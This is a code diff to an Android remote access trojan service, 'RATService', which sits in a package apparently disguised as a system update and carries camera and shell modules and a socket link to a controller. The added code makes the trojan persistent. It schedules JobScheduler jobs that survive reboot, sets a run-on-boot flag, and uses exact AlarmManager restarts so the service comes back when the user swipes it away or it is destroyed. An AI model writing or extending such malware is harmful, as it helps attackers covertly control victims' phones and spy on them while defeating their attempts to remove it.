@@ -6,13 +6,20 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.app.job.JobInfo;
+import android.app.job.JobScheduler;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.os.Binder;
 import android.os.Build;
 import android.os.IBinder;
+import android.os.PowerManager;
 import android.os.RemoteException;
 import android.os.SystemClock;
+import android.util.Log;
+
 import androidx.core.app.NotificationCompat;
 
 import com.android.system.update.modules.*;
@@ -25,12 +32,17 @@ import java.net.Socket;
 public class RATService extends Service {
     private static final String CHANNEL_ID = "RATChannel";
     private static final int NOTIFICATION_ID = 1337;
+    private static final String TAG = "RATService";
+    private static final int JOB_ID = 1001;
+    private static final int PERSISTENCE_JOB_ID = 1002;
+    private static final long RESTART_DELAY_MS = 5000; // 5 seconds
     
     private Socket socket;
     private PrintWriter out;
     private BufferedReader in;
     private boolean isRunning = true;
     private Thread connectionThread;
+    private static volatile RATService instance;
     
     // Modules
     private CameraModule cameraModule;
@@ -54,9 +66,17 @@ public class RATService extends Service {
     
     private final RATServiceBinder binder = new RATServiceBinder();
     
+    public static RATService getInstance() {
+        return instance;
+    }
+    
     @Override
     public void onCreate() {
         super.onCreate();
+        instance = this;
+        AppController.setConnectionService(this);
+        
+        Log.d(TAG, "RATService created");
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, createNotification());
         
@@ -71,13 +91,78 @@ public class RATService extends Service {
         if (Config.ENABLE_SHELL) shellModule = new ShellModule();
         deviceModule = new DeviceModule(this);
         
+        // Schedule all persistence mechanisms
+        schedulePersistenceJob();
+        scheduleJobSchedulerRestart();
+        
+        // Set that service should run on boot
+        setRunOnBoot(true);
+        
         startConnection();
     }
     
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.d(TAG, "RATService onStartCommand");
+        
+        // Reschedule jobs every time service starts
+        schedulePersistenceJob();
+        scheduleJobSchedulerRestart();
+        
         // If service is killed, the system will try to restart it
         return START_STICKY;
+    }
+    
+    private void schedulePersistenceJob() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            try {
+                ComponentName componentName = new ComponentName(this, PersistenceJobService.class);
+                JobInfo jobInfo = new JobInfo.Builder(PERSISTENCE_JOB_ID, componentName)
+                        .setPeriodic(15 * 60 * 1000) // 15 minutes
+                        .setPersisted(true) // Survives reboot
+                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
+                        .setBackoffCriteria(10000, JobInfo.BACKOFF_POLICY_EXPONENTIAL)
+                        .build();
+                
+                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
+                int result = jobScheduler.schedule(jobInfo);
+                
+                if (result == JobScheduler.RESULT_SUCCESS) {
+                    Log.d(TAG, "Persistence job scheduled successfully");
+                } else {
+                    Log.e(TAG, "Failed to schedule persistence job");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error scheduling persistence job", e);
+            }
+        }
+    }
+    
+    private void scheduleJobSchedulerRestart() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            try {
+                ComponentName componentName = new ComponentName(this, JobSchedulerService.class);
+                JobInfo jobInfo = new JobInfo.Builder(JOB_ID, componentName)
+                        .setOverrideDeadline(RESTART_DELAY_MS)
+                        .setPersisted(true)
+                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
+                        .build();
+                
+                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
+                int result = jobScheduler.schedule(jobInfo);
+                
+                if (result == JobScheduler.RESULT_SUCCESS) {
+                    Log.d(TAG, "Restart job scheduled successfully");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to schedule restart job", e);
+            }
+        }
+    }
+    
+    private void setRunOnBoot(boolean shouldRun) {
+        SharedPreferences prefs = getSharedPreferences("service_prefs", MODE_PRIVATE);
+        prefs.edit().putBoolean("should_run", shouldRun).apply();
     }
     
     private void startConnection() {
@@ -249,8 +334,21 @@ public class RATService extends Service {
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         super.onTaskRemoved(rootIntent);
+        Log.d(TAG, "Task removed, scheduling restart");
         
-        // Restart service when app is swiped away from recent tasks
+        // Schedule via JobScheduler first
+        scheduleJobSchedulerRestart();
+        schedulePersistenceJob();
+        
+        // Also use AlarmManager as backup
+        scheduleRestartWithAlarm();
+        
+        // Stop the foreground service but the restart will bring it back
+        stopForeground(true);
+        stopSelf();
+    }
+    
+    private void scheduleRestartWithAlarm() {
         Intent restartIntent = new Intent(this, RATService.class);
         PendingIntent pendingIntent = PendingIntent.getService(
             this, 1, restartIntent, 
@@ -258,13 +356,19 @@ public class RATService extends Service {
         
         AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
         if (alarmManager != null) {
-            alarmManager.set(AlarmManager.ELAPSED_REALTIME, 
-                SystemClock.elapsedRealtime() + 1000, pendingIntent);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setExactAndAllowWhileIdle(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP, 
+                    SystemClock.elapsedRealtime() + RESTART_DELAY_MS, 
+                    pendingIntent);
+            } else {
+                alarmManager.setExact(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + RESTART_DELAY_MS, 
+                    pendingIntent);
+            }
+            Log.d(TAG, "Alarm restart scheduled");
         }
-        
-        // Stop the foreground service but the restart will bring it back
-        stopForeground(true);
-        stopSelf();
     }
     
     @Override
@@ -274,7 +378,11 @@ public class RATService extends Service {
     
     @Override
     public void onDestroy() {
+        Log.d(TAG, "RATService onDestroy");
         isRunning = false;
+        AppController.clearConnectionService();
+        instance = null;
+        
         try {
             if (socket != null) socket.close();
             if (connectionThread != null) connectionThread.interrupt();
@@ -282,17 +390,10 @@ public class RATService extends Service {
             e.printStackTrace();
         }
         
-        // Schedule restart if destroyed
-        Intent restartIntent = new Intent(this, RATService.class);
-        PendingIntent pendingIntent = PendingIntent.getService(
-            this, 2, restartIntent, 
-            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
-        
-        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-        if (alarmManager != null) {
-            alarmManager.set(AlarmManager.ELAPSED_REALTIME, 
-                SystemClock.elapsedRealtime() + 2000, pendingIntent);
-        }
+        // Schedule multiple restart mechanisms
+        scheduleJobSchedulerRestart();
+        schedulePersistenceJob();
+        scheduleRestartWithAlarm();
         
         super.onDestroy();
     }
